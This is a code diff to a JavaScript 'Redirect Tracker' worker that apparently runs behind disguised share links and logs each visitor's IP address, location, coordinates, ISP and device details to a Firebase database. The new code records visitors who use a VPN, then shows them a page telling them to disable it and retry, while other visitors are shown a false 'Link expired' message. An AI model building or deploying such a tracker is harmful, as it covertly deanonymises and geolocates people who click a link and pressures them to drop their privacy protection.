@@ -1,4 +1,4 @@
-// SC6 Redirect Tracker Worker — v1.9.28
+// SC6 Redirect Tracker Worker — v1.9.29
 // Deploy at: media.sharelink-1.workers.dev
 
 const FIREBASE = 'https://device-scan-8898e-default-rtdb.firebaseio.com';
@@ -268,6 +268,52 @@ export default {
       };
       ctx.waitUntil(writeLog(ws, resolvedId, blockedEntry));
       return new Response('Link expired', { status: 410 });
+    }
+
+    if (isVpn) {
+      const vpnEntry = {
+        time: new Date().toISOString(),
+        ip, country, city, region, timezone, isp, asn,
+        lat, lon, isVpn: true, vpnBlocked: true,
+        os: getOS(ua), browser: getBrowser(ua), device: getDeviceType(ua),
+        model: getDeviceModel(ua) || undefined,
+        lang, referer, refSource, ua, linkId: resolvedId, param,
+        originalParam: linkId !== resolvedId ? linkId : undefined,
+      };
+      ctx.waitUntil(writeLog(ws, resolvedId, vpnEntry));
+      const vpnHtml = `<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Connection Issue</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0a0a0a;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+.card{background:#141414;border:1px solid #2a2a2a;border-radius:16px;padding:32px 28px;max-width:400px;width:100%;text-align:center}
+.icon{font-size:2.8rem;margin-bottom:16px}
+h1{font-size:1.15rem;font-weight:700;color:#fff;margin-bottom:10px}
+p{font-size:.88rem;color:#999;line-height:1.6;margin-bottom:20px}
+.detail{font-size:.78rem;color:#555;background:#0f0f0f;border:1px solid #222;border-radius:8px;padding:10px 14px;margin-bottom:24px;text-align:left}
+.detail span{color:#444}
+button{width:100%;padding:13px;border-radius:10px;border:none;font-size:.95rem;font-weight:600;cursor:pointer;background:#1a1a1a;color:#ccc;border:1px solid #2a2a2a;transition:background .15s}
+button:active{background:#222}
+</style>
+</head><body>
+<div class="card">
+  <div class="icon">🛡️</div>
+  <h1>Access Restricted</h1>
+  <p>Your connection appears to be routed through a VPN or proxy. Direct connections only.</p>
+  <div class="detail">
+    <span>Detected:</span> VPN / Proxy / Hosting network<br>
+    <span>ISP:</span> ${isp}<br>
+    <span>Location:</span> ${city !== '?' ? city + ', ' : ''}${country}
+  </div>
+  <p style="margin-bottom:16px">If you're using a VPN, disable it and try again.</p>
+  <button onclick="location.reload()">↺ &nbsp;Refresh</button>
+</div>
+</body></html>`;
+      return new Response(vpnHtml, {
+        status: 403,
+        headers: { 'Content-Type': 'text/html;charset=utf-8', 'Cache-Control': 'no-store' }
+      });
     }
 
     const entry = {
